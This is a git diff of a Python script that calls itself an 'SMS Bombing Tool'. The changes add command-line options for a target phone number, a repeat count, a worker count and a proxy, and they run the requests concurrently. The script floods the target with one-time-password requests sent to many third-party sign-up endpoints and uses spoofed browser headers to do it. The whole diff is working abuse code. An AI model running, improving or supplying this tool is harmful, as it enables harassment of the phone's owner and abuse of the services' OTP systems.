@@ -1,27 +1,76 @@
+import argparse
+import concurrent.futures
+import os
 import requests
+from datetime import datetime
+from time import sleep
+import signal
 from alive_progress import alive_bar
 from fake_headers import Headers
-from time import sleep
 from colorama import Fore, Style
-
 
 headers = Headers()
 
 
-def send_request(api_name, api_url, data):
+def send_request(api_name, api_url, data, timeout):
     generated_headers = headers.generate()
+    current_time = datetime.now().strftime("%H:%M:%S")
 
     try:
-        response = requests.post(api_url, headers=generated_headers, json=data)
+        response = requests.post(
+            api_url, headers=generated_headers, json=data, timeout=timeout
+        )
         response.raise_for_status()
 
-        return f"{Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
+        return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
     except requests.exceptions.RequestException as e:
-        return f"{Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
+        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
+
+
+def process_target(api):
+    return send_request(api["name"], api["url"], api["data"], timeout=5)
+
+
+def sigint_handler(signal, frame):
+    print(f"\n{Fore.YELLOW}[!] User interrupted the process.{Style.RESET_ALL}")
+    os._exit(1)
 
 
 def main():
-    phone_number = input(f"{Fore.BLUE}Enter the phone number:{Style.RESET_ALL} ")
+    signal.signal(signal.SIGINT, sigint_handler)
+
+    parser = argparse.ArgumentParser(description="SMS Bombing Tool")
+    parser.add_argument(
+        "-t", "--target", help="Specify the target phone number", required=True
+    )
+    parser.add_argument(
+        "-n",
+        "--times",
+        help="Specify the number of bombing times, default is 1",
+        type=int,
+        default=1,
+    )
+    parser.add_argument(
+        "--process",
+        help="Specify the number of processes, default is 5",
+        type=int,
+        default=5,
+    )
+    parser.add_argument(
+        "-v", "--verbose", help="Display additional info", action="store_true"
+    )
+    parser.add_argument("-x", "--proxy", help="Set the proxy for requests (http/https)")
+
+    args = parser.parse_args()
+
+    phone_number = args.target
+    bombing_times = args.times
+    process_num = args.process
+    verbose_level = args.verbose
+    proxy = args.proxy
+
+    if proxy:
+        print(f"Using proxy: {proxy}")
 
     apis = [
         {
@@ -98,11 +147,6 @@ def main():
             "name": "Mootanroo",
             "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
             "data": {"PhoneNumber": phone_number},
-        },
-        {
-            "name": "Tap33",
-            "url": "https://tap33.me/api/v2/user",
-            "data": {"credential": {"phoneNumber": "09333277301", "role": "BIKER"}},
         },
         {
             "name": "Tap33",
@@ -239,14 +283,39 @@ def main():
         # },
     ]
 
-    while True:
-        with alive_bar(len(apis), theme="smooth") as progress_bar:
-            for api in apis:
-                message = send_request(api["name"], api["url"], api["data"])
-                progress_bar()
-                print(message)
+    try:
+        with alive_bar(bombing_times * len(apis), theme="smooth") as progress_bar:
+            with concurrent.futures.ThreadPoolExecutor(
+                max_workers=process_num
+            ) as executor:
+                futures = [
+                    executor.submit(process_target, api) for api in apis * bombing_times
+                ]
 
-        sleep(1)
+                for future in concurrent.futures.as_completed(futures):
+                    progress_bar()
+                    result = future.result()
+                    if verbose_level:
+                        if "OK" in result:
+                            print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.RED}{result}{Style.RESET_ALL}")
+
+                sleep(1)
+
+        if not verbose_level:
+            results = [future.result() for future in futures]
+            succeeded = [result for result in results if "OK" in result]
+            failed = [result for result in results if "Failed" in result]
+
+            print(
+                f"\nSucceeded: {Fore.GREEN}{len(succeeded)}{Style.RESET_ALL}, "
+                f"Failed: {Fore.RED}{len(failed)}{Style.RESET_ALL}"
+            )
+
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] User interrupted the process.{Style.RESET_ALL}")
+        os._exit(1)
 
 
 if __name__ == "__main__":
